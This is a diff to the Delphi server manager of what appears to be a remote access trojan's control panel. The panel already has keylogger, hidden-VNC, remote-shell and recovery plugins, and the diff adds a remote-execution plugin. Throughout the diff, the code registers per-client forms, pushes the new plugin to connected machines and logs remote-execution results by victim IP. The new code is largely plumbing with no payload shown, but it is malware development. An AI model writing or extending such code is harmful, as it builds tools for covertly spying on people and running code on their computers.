@@ -4,7 +4,7 @@ interface
 
 uses
   Winapi.Windows, Winapi.Winsock2,
-  System.SysUtils, System.Classes, System.JSON,
+  System.SysUtils, System.Classes, System.JSON, System.Diagnostics,
   System.Generics.Collections, System.SyncObjs,
   Vcl.ExtCtrls, Vcl.Forms,
   ncSockets, ncLines,
@@ -15,10 +15,12 @@ uses
   UnitKeylogger,
   UnitOpenURL,
   UnitFileManager,
-  UnitHiddenVNC;
+  UnitHiddenVNC,
+  UnitRemoteExecution;
 
 const
   INFORMATION_PLUGIN_ID       = 'InformationPlugin';
+  REMOTE_EXECUTION_PLUGIN_ID  = 'RemoteExecutionPlugin';
   PROCESS_MANAGER_PLUGIN_ID   = 'ProcessManagerPlugin';
   REMOTE_SHELL_PLUGIN_ID      = 'RemoteShellPlugin';
   REMOTE_MONITORING_PLUGIN_ID = 'RemoteMonitoringPlugin';
@@ -120,6 +122,7 @@ type
     FOpenURLForms     : TDictionary<TncLine, TForm8>;
     FFileManagerForms : TDictionary<TncLine, TForm9>;
     FHiddenVNCForms   : TDictionary<TncLine, TForm10>;
+    FRemoteExecutionForms : TDictionary<TncLine, TForm11>;
     FReadBuffers      : TDictionary<TncLine, TBytes>;
     FHeartbeatTimer   : TTimer;
     FIsStopping       : Boolean;
@@ -162,6 +165,7 @@ type
     procedure DetachOpenURLForms;
     procedure DetachFileManagerForms;
     procedure DetachHiddenVNCForms;
+    procedure DetachRemoteExecutionForms;
 
   public
     constructor Create(aServer: TncTCPServer);
@@ -182,6 +186,7 @@ type
     procedure SendFileManagerPlugin(aLine: TncLine);
     procedure SendHiddenVNCPlugin(aLine: TncLine);
     procedure SendRecoveryPlugin(aLine: TncLine);
+    procedure SendRemoteExecutionPlugin(aLine: TncLine);
 
     function  TryGetClientInfo(aLine: TncLine; out Info: TClientInfo): Boolean;
     function  IsActive   : Boolean;
@@ -218,6 +223,10 @@ type
     procedure RegisterHiddenVNCForm  (aLine: TncLine; AForm: TForm10);
     procedure UnregisterHiddenVNCForm(aLine: TncLine);
     function  GetHiddenVNCForm       (aLine: TncLine): TForm10;
+
+    procedure RegisterRemoteExecutionForm  (aLine: TncLine; AForm: TForm11);
+    procedure UnregisterRemoteExecutionForm(aLine: TncLine);
+    function  GetRemoteExecutionForm       (aLine: TncLine): TForm11;
 
     property TotalReceivedBytes: Int64 read FTotalReceivedBytes;
     property TotalSentBytes: Int64 read FTotalSentBytes;
@@ -314,6 +323,7 @@ begin
   FOpenURLForms     := TDictionary<TncLine, TForm8>.Create;
   FFileManagerForms := TDictionary<TncLine, TForm9>.Create;
   FHiddenVNCForms   := TDictionary<TncLine, TForm10>.Create;
+  FRemoteExecutionForms := TDictionary<TncLine, TForm11>.Create;
   FReadBuffers      := TDictionary<TncLine, TBytes>.Create;
 
   FServer.OnConnected    := OnConnected;
@@ -338,7 +348,9 @@ begin
   DetachOpenURLForms;
   DetachFileManagerForms;
   DetachHiddenVNCForms;
+  DetachRemoteExecutionForms;
   FReadBuffers.Free;
+  FRemoteExecutionForms.Free;
   FHiddenVNCForms.Free;
   FFileManagerForms.Free;
   FOpenURLForms.Free;
@@ -730,6 +742,45 @@ begin
 end;
 
 { ---------------------------------------------------------------------- }
+{  Remote Execution form registration                                    }
+{ ---------------------------------------------------------------------- }
+
+procedure TServerManager.RegisterRemoteExecutionForm(aLine: TncLine; AForm: TForm11);
+begin
+  FLock.Enter;
+  try
+    FRemoteExecutionForms.AddOrSetValue(aLine, AForm);
+  finally
+    FLock.Leave;
+  end;
+end;
+
+procedure TServerManager.UnregisterRemoteExecutionForm(aLine: TncLine);
+var
+  AForm: TForm11;
+begin
+  FLock.Enter;
+  try
+    if FRemoteExecutionForms.TryGetValue(aLine, AForm) and Assigned(AForm) then
+      AForm.DetachCallbacks;
+    FRemoteExecutionForms.Remove(aLine);
+  finally
+    FLock.Leave;
+  end;
+end;
+
+function TServerManager.GetRemoteExecutionForm(aLine: TncLine): TForm11;
+begin
+  FLock.Enter;
+  try
+    if not FRemoteExecutionForms.TryGetValue(aLine, Result) then
+      Result := nil;
+  finally
+    FLock.Leave;
+  end;
+end;
+
+{ ---------------------------------------------------------------------- }
 {  Detach Helpers (called during shutdown)                                 }
 { ---------------------------------------------------------------------- }
 
@@ -826,6 +877,20 @@ begin
     for AForm in FHiddenVNCForms.Values do
       if Assigned(AForm) then AForm.DetachCallbacks;
     FHiddenVNCForms.Clear;
+  finally
+    FLock.Leave;
+  end;
+end;
+
+procedure TServerManager.DetachRemoteExecutionForms;
+var
+  AForm: TForm11;
+begin
+  FLock.Enter;
+  try
+    for AForm in FRemoteExecutionForms.Values do
+      if Assigned(AForm) then AForm.DetachCallbacks;
+    FRemoteExecutionForms.Clear;
   finally
     FLock.Leave;
   end;
@@ -1031,6 +1096,9 @@ begin SendPlugin(aLine, HIDDEN_VNC_PLUGIN_ID); end;
 procedure TServerManager.SendRecoveryPlugin(aLine: TncLine);
 begin SendPlugin(aLine, RECOVERY_PLUGIN_ID); end;
 
+procedure TServerManager.SendRemoteExecutionPlugin(aLine: TncLine);
+begin SendPlugin(aLine, REMOTE_EXECUTION_PLUGIN_ID); end;
+
 { ---------------------------------------------------------------------- }
 {  Server Events                                                           }
 { ---------------------------------------------------------------------- }
@@ -1083,6 +1151,7 @@ var
   OpenURLForm    : TForm8;
   FileManagerForm: TForm9;
   HiddenVNCForm  : TForm10;
+  RemoteExecutionForm: TForm11;
   CapturedLine   : TncLine;
   CB             : TClientRemoveEvent;
 begin
@@ -1123,6 +1192,10 @@ begin
     if FHiddenVNCForms.TryGetValue(aLine, HiddenVNCForm) and Assigned(HiddenVNCForm) then
       HiddenVNCForm.DetachCallbacks;
     FHiddenVNCForms.Remove(aLine);
+
+    if FRemoteExecutionForms.TryGetValue(aLine, RemoteExecutionForm) and Assigned(RemoteExecutionForm) then
+      RemoteExecutionForm.DetachCallbacks;
+    FRemoteExecutionForms.Remove(aLine);
   finally
     FLock.Leave;
   end;
@@ -1585,6 +1658,7 @@ begin
         else if SameText(PluginID, FILE_MANAGER_PLUGIN_ID)      then SendFileManagerPlugin(aLine)
         else if SameText(PluginID, HIDDEN_VNC_PLUGIN_ID)        then SendHiddenVNCPlugin(aLine)
         else if SameText(PluginID, RECOVERY_PLUGIN_ID)          then SendRecoveryPlugin(aLine)
+        else if SameText(PluginID, REMOTE_EXECUTION_PLUGIN_ID)  then SendRemoteExecutionPlugin(aLine)
         else SendPlugin(aLine, PluginID);
       end;
       Exit;
@@ -1665,6 +1739,31 @@ begin
         DoLog(lcCommand, '"openurl" success on ' + IP)
       else
         DoLog(lcError,   '"openurl" failed on ' + IP + MsgSuffix);
+      Exit;
+    end;
+
+    { ---- Remote Execution response ---- }
+    if Action = 'remote_execute_response' then
+    begin
+      Status    := '';
+      MsgSuffix := '';
+      if Assigned(JSONObj.Values['status'])  then Status    := JSONObj.Values['status'].Value;
+      if Assigned(JSONObj.Values['message']) then MsgSuffix := ': ' + JSONObj.Values['message'].Value;
+
+      if SameText(Status, 'success') then
+        DoLog(lcCommand, '"remote_execute" success on ' + IP + MsgSuffix)
+      else
+        DoLog(lcError,   '"remote_execute" failed on ' + IP + MsgSuffix);
+
+      var LF11 := GetRemoteExecutionForm(aLine);
+      if Assigned(LF11) then
+      begin
+        JSONClone := TJSONObject(JSONObj.Clone);
+        QueueToUI(procedure
+        begin
+          try LF11.HandleResponse(JSONClone); finally JSONClone.Free; end;
+        end);
+      end;
       Exit;
     end;
 
@@ -1768,12 +1867,3 @@ begin
 end;
 
 end.
-
-
-
-
-
-
-
-
-
